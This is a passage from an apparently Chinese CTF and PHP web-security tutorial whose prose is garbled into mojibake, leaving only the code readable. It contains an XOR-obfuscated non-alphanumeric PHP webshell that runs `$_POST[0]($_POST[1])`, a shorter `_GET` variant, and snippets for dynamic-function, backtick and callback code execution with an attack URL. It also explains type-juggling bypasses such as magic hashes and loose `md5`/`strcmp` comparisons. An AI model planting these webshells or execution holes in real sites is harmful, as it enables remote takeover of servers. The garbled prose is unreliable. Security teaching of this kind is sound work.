æ¥ç†è§£åé—¨æƒ³å®ç°çš„åŠŸèƒ½ã€‚</p><p>æˆ‘ä»¬å¸Œæœ›ä½¿ç”¨è¿™ç§åé—¨åˆ›å»ºä¸€äº›å¯ä»¥ç»•è¿‡æ£€æµ‹çš„å¹¶ä¸”å¯¹æˆ‘ä»¬æœ‰ç”¨çš„å­—ç¬¦ä¸²ï¼Œå¦‚ <code>_POST</code> ï¼Œ <code>system</code> ï¼Œ <code>call_user_func_array</code>ï¼Œæˆ–è€…æ˜¯ä»»ä½•æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿ã€‚</p><p>ä¸‹é¢æ˜¯ä¸ªéå¸¸ç®€å•çš„éæ•°å­—å­—æ¯çš„ <code>PHP</code> åé—¨ï¼š</p><pre><code class="hljs">&lt;?php    @$_++; // $_ = 1    $__=(&quot;#&quot;^&quot;|&quot;); // $__ = _    $__.=(&quot;.&quot;^&quot;~&quot;); // _P    $__.=(&quot;/&quot;^&quot;`&quot;); // _PO    $__.=(&quot;|&quot;^&quot;/&quot;); // _POS    $__.=(&quot;&#123;&quot;^&quot;/&quot;); // _POST     $&#123;$__&#125;[!$_]($&#123;$__&#125;[$_]); // $_POST[0]($_POST[1]);?&gt;</code></pre><p>åœ¨è¿™é‡Œæˆ‘è¯´æ˜ä¸‹ï¼Œ <code>.=</code> æ˜¯å­—ç¬¦ä¸²çš„è¿æ¥ï¼Œå…·ä½“å‚çœ‹ <code>PHP</code> è¯­æ³•</p><p>æˆ‘ä»¬ç”šè‡³å¯ä»¥å°†ä¸Šé¢çš„ä»£ç åˆå¹¶ä¸ºä¸€è¡Œï¼Œä»è€Œä½¿ç¨‹åºçš„å¯è¯»æ€§æ›´å·®ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><pre><code class="hljs">$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;&#123;&quot;^&quot;/&quot;);</code></pre><p>æˆ‘ä»¬å›åˆ° <code>xman</code> è®­ç»ƒèµ›çš„é‚£é¢˜æ¥çœ‹ï¼Œæˆ‘ä»¬çš„æƒ³æ³•æ˜¯é€šè¿‡æ„é€ å¼‚æˆ–æ¥å»ç»•è¿‡é‚£ä¸²å­—ç¬¦ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¯¥å¦‚ä½•æ„é€ è¿™ä¸ªå­—ä¸²ä½¿å¾—é•¿åº¦å°äº <code>40</code> å‘¢ï¼Ÿ</p><p>æˆ‘ä»¬æœ€ç»ˆæ˜¯è¦è¯»å–åˆ°é‚£ä¸ª <code>getFlag</code> å‡½æ•°ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ ä¸€ä¸ª <code>_GET</code> æ¥å»è¯»å–è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬æœ€ç»ˆæ„é€ äº†å¦‚ä¸‹å­—ç¬¦ä¸²ï¼š</p><p><img src="https://ctf-wiki.org/web/php/figure/preg_match/payloads.png"></p><p>å¯èƒ½å¾ˆå¤šå°ä¼™ä¼´çœ‹åˆ°è¿™é‡Œä»ç„¶æ— æ³•ç†è§£è¿™æ®µå­—ç¬¦ä¸²æ˜¯å¦‚ä½•æ„é€ çš„å§ï¼Œæˆ‘ä»¬å°±å¯¹è¿™æ®µå­—ç¬¦ä¸²è¿›è¡Œæ®µåˆ†æã€‚</p><h4>æ„é€  <code>_GET</code> è¯»å–</h4><p>é¦–å…ˆæˆ‘ä»¬å¾—çŸ¥é“ <code>_GET</code> ç”±ä»€ä¹ˆå¼‚æˆ–è€Œæ¥çš„ï¼Œç»è¿‡æˆ‘çš„å°è¯•ä¸åˆ†æï¼Œæˆ‘å¾—å‡ºäº†ä¸‹é¢çš„ç»“è®ºï¼š</p><pre><code class="hljs">&lt;?php    echo &quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;//_GET?&gt;</code></pre><p>è¿™æ®µä»£ç ä¸€å¤§å¨æ˜¯å•¥æ„æ€å‘¢ï¼Ÿå› ä¸º40ä¸ªå­—ç¬¦é•¿åº¦çš„é™åˆ¶ï¼Œå¯¼è‡´ä»¥å‰é€ä¸ªå­—ç¬¦å¼‚æˆ–æ‹¼æ¥çš„webshellä¸èƒ½ä½¿ç”¨ã€‚<br/>è¿™é‡Œå¯ä»¥ä½¿ç”¨phpä¸­å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„åå¼•å· <code>`</code> å’Œ <code>Linux</code> ä¸‹é¢çš„é€šé…ç¬¦ <code>?</code></p><ul><li><code>?</code> ä»£è¡¨åŒ¹é…ä¸€ä¸ªå­—ç¬¦</li><li><code>`</code> è¡¨ç¤ºæ‰§è¡Œå‘½ä»¤</li><li><code>&quot;</code> å¯¹ç‰¹æ®Šå­—ç¬¦ä¸²è¿›è¡Œè§£æ</li>    <p>ç”±äº <code>?</code> åªèƒ½åŒ¹é…ä¸€ä¸ªå­—ç¬¦ï¼Œè¿™ç§å†™æ³•çš„æ„æ€æ˜¯å¾ªç¯è°ƒç”¨ï¼Œåˆ†åˆ«åŒ¹é…ã€‚æˆ‘ä»¬å°†å…¶è¿›è¡Œåˆ†è§£æ¥çœ‹ï¼š</p><pre><code class="hljs">&lt;?php    echo &quot;&#123;&quot;^&quot;&lt;&quot;;?&gt;</code></pre><p>è¾“å‡ºç»“æœä¸ºï¼š</p><p><img src="https://ctf-wiki.org/web/php/figure/preg_match/answer3.png"></p><pre><code class="hljs">&lt;?php    echo &quot;&#123;&quot;^&quot;&gt;&quot;;?&gt;</code></pre><p>è¾“å‡ºç»“æœä¸ºï¼š</p><p><img src="https://ctf-wiki.org/web/php/figure/preg_match/answer4.png"></p><pre><code class="hljs">&lt;?php    echo &quot;&#123;&quot;^&quot;/&quot;;?&gt;</code></pre><p>è¾“å‡ºç»“æœä¸ºï¼š</p><p><img src="https://ctf-wiki.org/web/php/figure/preg_match/answer5.png"></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œ <code>_GET</code> å°±æ˜¯è¿™ä¹ˆè¢«æ„é€ å‡ºæ¥çš„å•¦ï¼</p><h4>è·å– <code>_GET</code> å‚æ•°</h4><p>æˆ‘ä»¬åˆè¯¥å¦‚ä½•è·å– <code>_GET</code> å‚æ•°å‘¢ï¼Ÿå’±ä»¬å¯ä»¥æ„é€ å‡ºå¦‚ä¸‹å­—ä¸²ï¼š</p><pre><code class="hljs">&lt;?php    echo $&#123;$_&#125;[_]($&#123;$_&#125;[__]);//$_GET[_]($_GET[__])?&gt;</code></pre><p>æ ¹æ®å‰é¢æ„é€ çš„æ¥çœ‹ï¼Œ <code>$_</code> å·²ç»å˜æˆäº† <code>_GET</code> ã€‚é¡ºç†æˆç« çš„æ¥è®²ï¼Œ <code>$_ = _GET</code> ã€‚æˆ‘ä»¬æ„å»º <code>$_GET[__]</code> æ˜¯ä¸ºäº†è¦è·å–å‚æ•°å€¼ã€‚</p><h4>ä¼ å…¥å‚æ•°</h4><p>æ­¤æ—¶æˆ‘ä»¬åªéœ€è¦å»è°ƒç”¨ <code>getFlag</code> å‡½æ•°è·å– <code>webshell</code> å°±å¥½äº†ï¼Œæ„é€ å¦‚ä¸‹ï¼š</p><pre><code class="hljs">&lt;?php    echo $_=getFlag;//getFlag?&gt;</code></pre><p>æ‰€ä»¥æŠŠå‚æ•°å…¨éƒ¨è¿æ¥èµ·æ¥ï¼Œå°±å¯ä»¥äº†ã€‚</p><p><img src="https://ctf-wiki.org/web/php/figure/preg_match/payloads.png"></p><p>ç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://ctf-wiki.org/web/php/figure/preg_match/flag.png"></p><p>äºæ˜¯æˆ‘ä»¬å°±æˆåŠŸåœ°è¯»å–åˆ°äº†flagï¼</p></details><h3 id="åŠ¨æ€å‡½æ•°æ‰§è¡Œ"><a href="#åŠ¨æ€å‡½æ•°æ‰§è¡Œ" class="headerlink" title="åŠ¨æ€å‡½æ•°æ‰§è¡Œ"></a>åŠ¨æ€å‡½æ•°æ‰§è¡Œ</h3><p>ç”¨æˆ·è‡ªå®šä¹‰çš„å‡½æ•°å¯ä»¥å¯¼è‡´ä»£ç æ‰§è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$dyn_func</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;dyn_func&quot;</span>];<br><span class="hljs-variable">$argument</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;argument&quot;</span>];<br><span class="hljs-variable">$dyn_func</span>(<span class="hljs-variable">$argument</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="åå¼•å·å‘½ä»¤æ‰§è¡Œ"><a href="#åå¼•å·å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="åå¼•å·å‘½ä»¤æ‰§è¡Œ"></a>åå¼•å·å‘½ä»¤æ‰§è¡Œ</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> `ls -al`;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="Curly-Syntax"><a href="#Curly-Syntax" class="headerlink" title="Curly Syntax"></a>Curly Syntax</h3><p>PHP çš„ Curly Syntax ä¹Ÿèƒ½å¯¼è‡´ä»£ç æ‰§è¡Œï¼Œå®ƒå°†æ‰§è¡ŒèŠ±æ‹¬å·é—´çš„ä»£ç ï¼Œå¹¶å°†ç»“æœæ›¿æ¢å›å»ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;aaabbbccc $&#123;`ls`&#125;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$foobar</span> = <span class="hljs-string">&quot;phpinfo&quot;</span>;<br>$&#123;<span class="hljs-string">&quot;foobar&quot;</span>&#125;();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="å›è°ƒå‡½æ•°"><a href="#å›è°ƒå‡½æ•°" class="headerlink" title="å›è°ƒå‡½æ•°"></a>å›è°ƒå‡½æ•°</h3><p>å¾ˆå¤šå‡½æ•°éƒ½å¯ä»¥æ‰§è¡Œå›è°ƒå‡½æ•°ï¼Œå½“å›è°ƒå‡½æ•°ç”¨æˆ·å¯æ§æ—¶ï¼Œå°†å¯¼è‡´ä»£ç æ‰§è¡Œã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$evil_callback</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;callback&quot;</span>];<br><span class="hljs-variable">$some_array</span> = <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<br><span class="hljs-variable">$new_array</span> = <span class="hljs-title function_ invoke__">array_map</span>(<span class="hljs-variable">$evil_callback</span>, <span class="hljs-variable">$some_array</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>æ”»å‡» payload</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//www.a.com/index.php?callback=phpinfo</span><br></code></pre></td></tr></table></figure><h3 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h3><p><a href="https://www.sunynov.top/2025/12/24/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">åœ¨è¿™å„¿å‘¢</a></p><h2 id="PHP-ç‰¹æ€§"><a href="#PHP-ç‰¹æ€§" class="headerlink" title="PHP ç‰¹æ€§"></a>PHP ç‰¹æ€§</h2><h3 id="æ•°ç»„"><a href="#æ•°ç»„" class="headerlink" title="æ•°ç»„"></a>æ•°ç»„</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$var</span> = <span class="hljs-number">1</span>;<br><span class="hljs-variable">$var</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-variable">$var</span> = <span class="hljs-string">&quot;string&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>php ä¸ä¼šä¸¥æ ¼æ£€éªŒä¼ å…¥çš„å˜é‡ç±»å‹ï¼Œä¹Ÿå¯ä»¥å°†å˜é‡è‡ªç”±çš„è½¬æ¢ç±»å‹ã€‚</p><p>æ¯”å¦‚åœ¨ <code>$a == $b</code> çš„æ¯”è¾ƒä¸­</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-literal">null</span>; <br><span class="hljs-variable">$b</span> = <span class="hljs-literal">false</span>; <span class="hljs-comment">//ä¸ºçœŸ </span><br><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;&#x27;</span>; <br><span class="hljs-variable">$b</span> = <span class="hljs-number">0</span>; <span class="hljs-comment">//åŒæ ·ä¸ºçœŸ</span><br></code></pre></td></tr></table></figure><p>ç„¶è€Œï¼ŒPHP å†…æ ¸çš„å¼€å‘è€…åŸæœ¬æ˜¯æƒ³è®©ç¨‹åºå‘˜å€Ÿç”±è¿™ç§ä¸éœ€è¦å£°æ˜çš„ä½“ç³»ï¼Œæ›´åŠ é«˜æ•ˆçš„å¼€å‘ï¼Œæ‰€ä»¥åœ¨å‡ ä¹æ‰€æœ‰å†…ç½®å‡½æ•°ä»¥åŠåŸºæœ¬ç»“æ„ä¸­ä½¿ç”¨äº†å¾ˆå¤šæ¾æ•£çš„æ¯”è¾ƒå’Œè½¬æ¢ï¼Œé˜²æ­¢ç¨‹åºä¸­çš„å˜é‡å› ä¸ºç¨‹åºå‘˜çš„ä¸è§„èŒƒè€Œé¢‘ç¹çš„æŠ¥é”™ï¼Œç„¶è€Œè¿™å´å¸¦æ¥äº†å®‰å…¨é—®é¢˜ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">0</span>==<span class="hljs-string">&#x27;0&#x27;</span> <span class="hljs-comment">//true</span><br><span class="hljs-number">0</span> == <span class="hljs-string">&#x27;abcdefg&#x27;</span> <span class="hljs-comment">//true</span><br><span class="hljs-number">0</span> === <span class="hljs-string">&#x27;abcdefg&#x27;</span> <span class="hljs-comment">//false</span><br><span class="hljs-number">1</span> == <span class="hljs-string">&#x27;1abcdef&#x27;</span> <span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><h3 id="é­”æ³•-Hash"><a href="#é­”æ³•-Hash" class="headerlink" title="é­”æ³• Hash"></a>é­”æ³• Hash</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;0e132456789&quot;</span>==<span class="hljs-string">&quot;0e7124511451155&quot;</span> <span class="hljs-comment">//true</span><br><span class="hljs-string">&quot;0e123456abc&quot;</span>==<span class="hljs-string">&quot;0e1dddada&quot;</span> <span class="hljs-comment">//false</span><br><span class="hljs-string">&quot;0e1abc&quot;</span>==<span class="hljs-string">&quot;0&quot;</span>  <span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><p>åœ¨è¿›è¡Œæ¯”è¾ƒè¿ç®—æ—¶ï¼Œå¦‚æœé‡åˆ°äº† <code>0e\d+</code> è¿™ç§å­—ç¬¦ä¸²ï¼Œå°±ä¼šå°†è¿™ç§å­—ç¬¦ä¸²è§£æä¸ºç§‘å­¦è®¡æ•°æ³•ã€‚æ‰€ä»¥ä¸Šé¢ä¾‹å­ä¸­ 2 ä¸ªæ•°çš„å€¼éƒ½æ˜¯ 0 å› è€Œå°±ç›¸ç­‰äº†ã€‚å¦‚æœä¸æ»¡è¶³ <code>0e\d+</code> è¿™ç§æ¨¡å¼å°±ä¸ä¼šç›¸ç­‰ã€‚</p><h3 id="åå…­è¿›åˆ¶è½¬æ¢"><a href="#åå…­è¿›åˆ¶è½¬æ¢" class="headerlink" title="åå…­è¿›åˆ¶è½¬æ¢"></a>åå…­è¿›åˆ¶è½¬æ¢</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;0x1e240&quot;</span>==<span class="hljs-string">&quot;123456&quot;</span> <span class="hljs-comment">//true</span><br><span class="hljs-string">&quot;0x1e240&quot;</span>==<span class="hljs-number">123456</span> <span class="hljs-comment">//true</span><br><span class="hljs-string">&quot;0x1e240&quot;</span>==<span class="hljs-string">&quot;1e240&quot;</span> <span class="hljs-comment">//false</span><br></code></pre></td></tr></table></figure><p>å½“å…¶ä¸­çš„ä¸€ä¸ªå­—ç¬¦ä¸²æ˜¯ <code>0x</code> å¼€å¤´çš„æ—¶å€™ï¼ŒPHP ä¼šå°†æ­¤å­—ç¬¦ä¸²è§£ææˆä¸ºåè¿›åˆ¶ç„¶åå†è¿›è¡Œæ¯”è¾ƒï¼Œ<code>0x1240</code> è§£ææˆä¸ºåè¿›åˆ¶å°±æ˜¯ 123456ï¼Œæ‰€ä»¥ä¸ <code>int</code> ç±»å‹å’Œ <code>string</code> ç±»å‹çš„ 123456 æ¯”è¾ƒéƒ½æ˜¯ç›¸ç­‰ã€‚</p><h3 id="ç±»å‹è½¬æ¢"><a href="#ç±»å‹è½¬æ¢" class="headerlink" title="ç±»å‹è½¬æ¢"></a>ç±»å‹è½¬æ¢</h3><p>å¸¸è§çš„è½¬æ¢ä¸»è¦å°±æ˜¯ <code>int</code> è½¬æ¢ä¸º <code>string</code>ï¼Œ<code>string</code> è½¬æ¢ä¸º <code>int</code>ã€‚</p><p><code>int</code> è½¬ <code>string</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$var</span> = <span class="hljs-number">5</span>;<br>æ–¹å¼<span class="hljs-number">1</span>ï¼š<span class="hljs-variable">$item</span> = (<span class="hljs-keyword">string</span>)<span class="hljs-variable">$var</span>;<br>æ–¹å¼<span class="hljs-number">2</span>ï¼š<span class="hljs-variable">$item</span> = <span class="hljs-title function_ invoke__">strval</span>(<span class="hljs-variable">$var</span>);<br></code></pre></td></tr></table></figure><p><code>string</code> è½¬ <code>int</code>ï¼š<code>intval()</code> å‡½æ•°ã€‚</p><p>å¯¹äºè¿™ä¸ªå‡½æ•°ï¼Œå¯ä»¥å…ˆçœ‹ 2 ä¸ªä¾‹å­ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-string">&#x27;2&#x27;</span>)) <span class="hljs-comment">//2</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-string">&#x27;3abcd&#x27;</span>)) <span class="hljs-comment">//3</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-string">&#x27;abcd&#x27;</span>)) <span class="hljs-comment">//0</span><br></code></pre></td></tr></table></figure><p>è¯´æ˜ <code>intval()</code> è½¬æ¢çš„æ—¶å€™ï¼Œä¼šä»å­—ç¬¦ä¸²çš„å¼€å§‹è¿›è¡Œè½¬æ¢ç›´åˆ°é‡åˆ°ä¸€ä¸ªéæ•°å­—çš„å­—ç¬¦ã€‚å³ä½¿å‡ºç°æ— æ³•è½¬æ¢çš„å­—ç¬¦ä¸²ï¼Œ <code>intval()</code> ä¸ä¼šæŠ¥é”™è€Œæ˜¯è¿”å› 0ã€‚</p><p>åŒæ—¶ï¼Œç¨‹åºå‘˜åœ¨ç¼–ç¨‹çš„æ—¶å€™ä¹Ÿä¸åº”è¯¥ä½¿ç”¨å¦‚ä¸‹çš„è¿™æ®µä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$a</span>)&gt;<span class="hljs-number">1000</span>) &#123;<br> <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-string">&quot;select * from news where id=&quot;</span>.<span class="hljs-variable">$a</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™ <code>$a</code> çš„å€¼æœ‰å¯èƒ½æ˜¯ <code>1002 union</code>ã€‚</p><h3 id="å†…ç½®å‡½æ•°çš„å‚æ•°çš„æ¾æ•£æ€§"><a href="#å†…ç½®å‡½æ•°çš„å‚æ•°çš„æ¾æ•£æ€§" class="headerlink" title="å†…ç½®å‡½æ•°çš„å‚æ•°çš„æ¾æ•£æ€§"></a>å†…ç½®å‡½æ•°çš„å‚æ•°çš„æ¾æ•£æ€§</h3><p>å†…ç½®å‡½æ•°çš„æ¾æ•£æ€§è¯´çš„æ˜¯ï¼Œè°ƒç”¨å‡½æ•°æ—¶ç»™å‡½æ•°ä¼ é€’å‡½æ•°æ— æ³•æ¥å—çš„å‚æ•°ç±»å‹ã€‚è§£é‡Šèµ·æ¥æœ‰ç‚¹æ‹—å£ï¼Œè¿˜æ˜¯ç›´æ¥é€šè¿‡å®é™…çš„ä¾‹å­æ¥è¯´æ˜é—®é¢˜ï¼Œä¸‹é¢ä¼šé‡ç‚¹ä»‹ç»å‡ ä¸ªè¿™ç§å‡½æ•°ã€‚</p><p><strong>md5()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$array1</span>[] = <span class="hljs-keyword">array</span>(<br> <span class="hljs-string">&quot;foo&quot;</span> =&gt; <span class="hljs-string">&quot;bar&quot;</span>,<br> <span class="hljs-string">&quot;bar&quot;</span> =&gt; <span class="hljs-string">&quot;foo&quot;</span>,<br>);<br><span class="hljs-variable">$array2</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>, <span class="hljs-string">&quot;hello&quot;</span>, <span class="hljs-string">&quot;world&quot;</span>);<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$array1</span>)==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$array2</span>)); <span class="hljs-comment">//true</span><br></code></pre></td></tr></table></figure><p>PHP æ‰‹å†Œä¸­çš„ md5ï¼ˆï¼‰å‡½æ•°çš„æè¿°æ˜¯ <code>string md5 ( string $str [, bool $raw_output = false ] )</code>ï¼Œ<code>md5()</code> ä¸­çš„éœ€è¦æ˜¯ä¸€ä¸ª string ç±»å‹çš„å‚æ•°ã€‚ä½†æ˜¯å½“ä½ ä¼ é€’ä¸€ä¸ª array æ—¶ï¼Œ<code>md5()</code> ä¸ä¼šæŠ¥é”™ï¼Œåªæ˜¯ä¼šæ— æ³•æ­£ç¡®åœ°æ±‚å‡º array çš„ md5 å€¼ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´ä»»æ„ 2 ä¸ª array çš„ md5 å€¼éƒ½ä¼šç›¸ç­‰ã€‚</p><p><strong>strcmp()</strong></p><p><code>strcmp()</code> å‡½æ•°åœ¨ PHP å®˜æ–¹æ‰‹å†Œä¸­çš„æè¿°æ˜¯ <code>intstrcmp ( string $str1 ï¼Œ string $str2 )</code>ï¼Œéœ€è¦ç»™ <code>strcmp()</code> ä¼ é€’ 2 ä¸ª <code>string</code> ç±»å‹çš„å‚æ•°ã€‚å¦‚æœ <code>str1</code> å°äº <code>str2</code>ï¼Œè¿”å› -1ï¼Œç›¸ç­‰è¿”å› 0ï¼Œå¦åˆ™è¿”å› 1ã€‚<code>strcmp()</code> å‡½æ•°æ¯”è¾ƒå­—ç¬¦ä¸²çš„æœ¬è´¨æ˜¯å°†ä¸¤ä¸ªå˜é‡è½¬æ¢ä¸º ASCIIï¼Œç„¶åè¿›è¡Œå‡æ³•è¿ç®—ï¼Œç„¶åæ ¹æ®è¿ç®—ç»“æœæ¥å†³å®šè¿”å›å€¼ã€‚</p><p>å¦‚æœä¼ å…¥ç»™å‡º <code>strcmp()</code> çš„å‚æ•°æ˜¯æ•°å­—å‘¢ï¼Ÿ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$array</span>=[<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">strcmp</span>(<span class="hljs-variable">$array</span>,<span class="hljs-string">&#x27;123&#x27;</span>)); <span class="hljs-comment">//null,åœ¨æŸç§æ„ä¹‰ä¸Šnullä¹Ÿå°±æ˜¯ç›¸å½“äºfalseã€‚</span><br></code></pre></td></tr></table></figure><p><strong>switch()</strong></p><p>å¦‚æœ <code>switch()</code> æ˜¯æ•°å­—ç±»å‹çš„ case çš„åˆ¤æ–­æ—¶ï¼Œswitch ä¼šå°†å…¶ä¸­çš„å‚æ•°è½¬æ¢ä¸º int ç±»å‹ã€‚å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$i</span> =<span class="hljs-string">&quot;2abc&quot;</span>;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$i</span>) &#123;<br><span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br><span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;i is less than 3 but not negative&quot;</span>;<br> <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;i is 3&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™ç¨‹åºè¾“å‡ºçš„æ˜¯ <code>i is less than 3 but not negative</code> ï¼Œæ˜¯ç”±äº <code>switch()</code> å‡½æ•°å°† <code>$i</code> è¿›è¡Œäº†ç±»å‹è½¬æ¢ï¼Œè½¬æ¢ç»“æœä¸º 2ã€‚</p><p><strong>in_array()</strong></p><p>åœ¨ PHP æ‰‹å†Œä¸­ï¼Œ <code>in_array()</code> å‡½æ•°çš„è§£é‡Šæ˜¯ <code>bool in_array ( mixed $needle , array $haystack [, bool $strict = FALSE ] )</code> ,å¦‚æœstrictå‚æ•°æ²¡æœ‰æä¾›ï¼Œé‚£ä¹ˆ <code>in_array</code> å°±ä¼šä½¿ç”¨æ¾æ•£æ¯”è¾ƒæ¥åˆ¤æ–­ <code>$needle</code> æ˜¯å¦åœ¨ <code>$haystack</code> ä¸­ã€‚å½“ strict çš„å€¼ä¸º true æ—¶ï¼Œ <code>in_array()</code> ä¼šæ¯”è¾ƒ needls çš„ç±»å‹å’Œ haystack ä¸­çš„ç±»å‹æ˜¯å¦ç›¸åŒã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$array</span>=[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;3&#x27;</span>];<br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span 